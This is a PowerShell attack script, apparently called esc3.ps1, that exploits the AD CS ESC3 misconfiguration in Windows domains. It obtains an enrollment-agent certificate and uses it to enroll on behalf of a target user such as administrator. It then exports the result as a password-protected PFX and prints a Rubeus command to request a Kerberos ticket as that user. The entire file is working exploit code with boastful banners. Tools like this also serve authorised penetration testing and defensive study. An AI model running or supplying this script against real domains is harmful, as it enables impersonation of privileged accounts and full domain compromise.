 param (
    [Parameter(Mandatory = $true, Position = 0)] [string]$templateName,
    [Parameter(Mandatory = $true, Position = 1)] [string]$target_user,
    [Parameter(Mandatory = $true, Position = 2)] [string]$domain,
    [Parameter(Mandatory = $true, Position = 3)] [string]$pfxPass
) 
Write-Host ""
Write-Host "   ____            _   _    ____  _           _ "
Write-Host "  / ___|  ___ _ __| |_(_)  | __ )| |__   __ _(_)"
Write-Host " | |     / _ | '__| __| |  |  _ \| '_ \ / _ ` | |"
Write-Host " | |___ |  __| |  | |_| |  | |_) | | | | (_| | |"
Write-Host "  \____| \___|_|   \__|_|  |____/|_| |_|\__,_|_|"
Write-Host "                                            "
Write-Host "                               Because AD CS is a Pure Gold \m/  "

$subjectName = "cn=administrator"
$altName = "administrator"

# Validate input
if (-not $target_user -or -not $templateName  -or -not $domain -or -not $pfxPass  ) {
    Write-Host "Missing required parameters. Usage: .\esc3.ps1 -templateName 'vuln' -target_user 'administrator' -domain queen -pfxPass 'password'"
    exit
}

Write-Host "
#########################################################################
# Certificate template with following informartion
# Target User: $target_user
# PFX Pass: $pfxPass
# template: $templateName
#########################################################################
"

$PrivateKey = New-Object -ComObject X509Enrollment.CX509PrivateKey
$PrivateKey.ProviderName = "Microsoft Enhanced Cryptographic Provider v1.0"
$PrivateKey.Length = 2048
$PrivateKey.KeySpec = 1
$PrivateKey.ExportPolicy = 1  # Exportable
$PrivateKey.ExportPolicy = $PrivateKey.ExportPolicy -bor 2
$PrivateKey.MachineContext = $false
$PrivateKey.Create()

# Create a new certificate request object
$CertRequest = New-Object -ComObject X509Enrollment.CX509CertificateRequestPkcs10
$CertRequest.InitializeFromPrivateKey(0x1, $PrivateKey, "")  

# Set the subject name
$DN = New-Object -ComObject X509Enrollment.CX500DistinguishedName
$DN.Encode($subjectName, 0)
$CertRequest.Subject = $DN

$Enrollment = New-Object -ComObject X509Enrollment.CX509Enrollment
$Enrollment.InitializeFromRequest($CertRequest)

$CSR = $Enrollment.CreateRequest(0)
Write-Output " [+] Generated CSR \m/ "


$RootDSE = [ADSI]"LDAP://RootDSE"
$ConfigDN = $RootDSE.configurationNamingContext
$SearchBase = "LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services," + $ConfigDN
$DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher
$DirectorySearcher.SearchRoot = [ADSI]$SearchBase
$DirectorySearcher.Filter = "(objectClass=pKIEnrollmentService)"
$DirectorySearcher.PropertiesToLoad.Add("cn") | Out-Null
$DirectorySearcher.PropertiesToLoad.Add("dNSHostName") | Out-Null
$CAs = $DirectorySearcher.FindAll()
$CAName = "$($CAs[0].Properties.dnshostname)\$($CAs[0].Properties.cn)"

Write-Host " [+] Making cert request to Certificate Authotirthy: $CAName "

$CertRequest = New-Object -ComObject CertificateAuthority.Request
$Status = $CertRequest.Submit(0,$csr,"CertificateTemplate:$templateName",$CAName)
$RequestID = $CertRequest.GetRequestId()

if ($Status -eq 3) {  
        Write-Output " [+] Certificate submitted successfully! Request ID is $RequestID "
        Write-Output " [+] Time to request the issued Certificate 8-) "
        $PemContent = $CertRequest.GetCertificate(0)
        $Base64 = $PemContent -replace "-----BEGIN CERTIFICATE-----", "" -replace "-----END CERTIFICATE-----", "" -replace "\s", ""
        $CertBytes = [Convert]::FromBase64String($Base64)
        
        if ($CertBytes) {
        $X509Cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 -ArgumentList (, $CertBytes)
        $thumbprint= $($X509Cert.Thumbprint)
        Write-Output " [+] Requested Certificate has Thumbprint: $thumbprint `n"
         } 
    
    $Response = New-Object -ComObject X509Enrollment.CX509Enrollment
    $Response.Initialize(0x1)
    $final = $Response.InstallResponse(0,$Base64,0x1,"")
       
    $PKCS10 = New-Object -ComObject X509Enrollment.CX509CertificateRequestPkcs10
    $PKCS10.InitializeFromTemplateName(0x1,"User")
    $PKCS10.Encode()
    $pkcs7 = New-Object -ComObject X509enrollment.CX509CertificateRequestPkcs7
    $pkcs7.InitializeFromInnerRequest($pkcs10)
    $pkcs7.RequesterName = "$domain\$target_user"

    $signer = New-Object -ComObject X509Enrollment.CSignerCertificate
    $cert = Get-ChildItem Cert:\CurrentUser\My | Where-Object {$_.Extensions | Where-Object {$_.Oid.Value -eq "2.5.29.37" -and $_.EnhancedKeyUsages["1.3.6.1.4.1.311.20.2.1"]}}
    $Base64 = [Convert]::ToBase64String($Cert.RawData)

    $signer = New-Object -ComObject X509Enrollment.CSignerCertificate
    $signer.Initialize(0,0,1,$Base64)
    $signer = New-Object -ComObject X509Enrollment.CSignerCertificate
    $signer.Initialize(0,0,0xc,$thumbprint)
    $pkcs7.SignerCertificate = $signer
    $Request = New-Object -ComObject X509Enrollment.CX509Enrollment
    $Request.InitializeFromRequest($pkcs7)
    $Request.Enroll()

    $IssuedCertBase64 = $Request.Certificate(0) 

     $Base64 = $IssuedCertBase64 -replace "-----BEGIN CERTIFICATE-----", "" -replace "-----END CERTIFICATE-----", "" -replace "\s", ""
     $CertBytes = [Convert]::FromBase64String($Base64)
     if ($CertBytes) {
            
            $X509Cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 -ArgumentList (, $CertBytes)
            $thumbprint= $($X509Cert.Thumbprint)
             Write-Output " [+] Requested Certificate has Thumbprint: $thumbprint"
                 } 
        $Certins = Get-ChildItem -Path Cert:\CurrentUser\My | where{$_.Thumbprint -eq  $thumbprint }

        if ($Certins -eq $null) {
            Write-Error " Certificate not found :("
            exit 1
        }
        else {
                Write-Output " [+] Hold my TEA while I export the PFX >:D<"
               }
        

            $pfxPassword = ConvertTo-SecureString -String $pfxPass -Force -AsPlainText
            $pfxBytes = $certins.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx, $pfxPassword)
            $base64Pfx = [Convert]::ToBase64String($pfxBytes)

            Write-Output "`n-----Enjoy-----"
            Write-Output " Use following command to obtain a TGT `n Rubeus.exe asktgt /user:$target_user /password:$pfxPass /certificate:$base64Pfx /nowrap /domain: /dc:"
             }
